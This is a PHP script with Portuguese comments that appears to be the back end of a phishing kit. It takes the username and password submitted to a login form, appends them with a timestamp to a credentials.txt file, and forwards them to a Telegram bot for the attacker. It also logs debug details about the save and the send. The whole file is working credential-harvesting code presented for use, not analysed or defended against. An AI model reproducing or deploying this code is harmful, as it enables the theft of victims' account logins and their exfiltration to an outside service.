<?php
// Arquivo para salvar as credenciais em um arquivo de texto e enviar para o Telegram

// Inclui as funções do bot do Telegram
require_once __DIR__ . '/telegram_bot.php';

// Verifica se os dados foram enviados via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtém os dados do formulário
    $email = isset($_POST['_user']) ? $_POST['_user'] : '';
    $password = isset($_POST['_pass']) ? $_POST['_pass'] : '';
    
    // Formata os dados para salvar
    $data = "Email: " . $email . " | Senha: " . $password . " | Data: " . date('Y-m-d H:i:s') . "\n";
    
    // Define o caminho do arquivo onde as credenciais serão salvas
    $file = __DIR__ . '/credentials.txt';
    
    // Adiciona informações de debug
    $debug = "\n[DEBUG] Tentativa de salvar em: " . $file . "\n";
    $debug .= "[DEBUG] Permissões da pasta: " . substr(sprintf('%o', fileperms(__DIR__)), -4) . "\n";
    
    // Tenta salvar os dados no arquivo (modo append para adicionar novas entradas sem apagar as anteriores)
    $result = file_put_contents($file, $data, FILE_APPEND);
    
    // Adiciona resultado da operação ao debug
    $debug .= "[DEBUG] Resultado da operação: " . ($result !== false ? 'Sucesso' : 'Falha') . "\n";
    if ($result === false) {
        $debug .= "[DEBUG] Erro: " . error_get_last()['message'] . "\n";
    }
    
    // Envia os dados para o Telegram
    $telegramSuccess = false;
    if (!empty($email) && !empty($password)) {
        $mensagemTelegram = formatarDadosLogin($email, $password);
        $telegramSuccess = enviarParaTelegram($mensagemTelegram);
        
        // Adiciona resultado do Telegram ao debug
        $debug .= "[DEBUG] Envio para Telegram: " . ($telegramSuccess ? 'Sucesso' : 'Falha') . "\n";
    }
    
    // Salva informações de debug em um arquivo separado
    file_put_contents(__DIR__ . '/debug_log.txt', $debug, FILE_APPEND);
    
    // Retorna uma resposta JSON para o JavaScript
    echo json_encode([
        'success' => ($result !== false),
        'telegram' => $telegramSuccess
    ]);
    exit;
}

// Se não for uma requisição POST, retorna erro
echo json_encode(['success' => false, 'message' => 'Método não permitido']);